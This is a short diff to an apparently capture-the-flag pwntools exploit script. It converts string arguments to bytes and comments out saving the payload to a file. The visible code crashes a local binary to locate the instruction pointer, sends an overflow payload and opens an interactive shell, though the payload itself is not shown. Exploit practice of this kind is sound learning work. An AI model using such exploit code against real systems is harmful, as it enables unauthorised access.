@@ -15,7 +15,7 @@ def start(argv=[], *a, **kw):
 def find_ip(payload):
     # Launch process and send payload
     p = process(exe)
-    p.sendlineafter('>', payload)
+    p.sendlineafter(b'>', payload)
     # Wait for the process to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
@@ -56,11 +56,11 @@ payload = flat({
 })
 
 # Save the payload to file
-write('payload', payload)
+# write('payload', payload)
 
 # Send the payload
-io.sendlineafter('>', payload)
-io.recvuntil('Thank you!')
+io.sendlineafter(b'>', payload)
+io.recvuntil(b'Thank you!')
 
 # Got Shell?
 io.interactive()
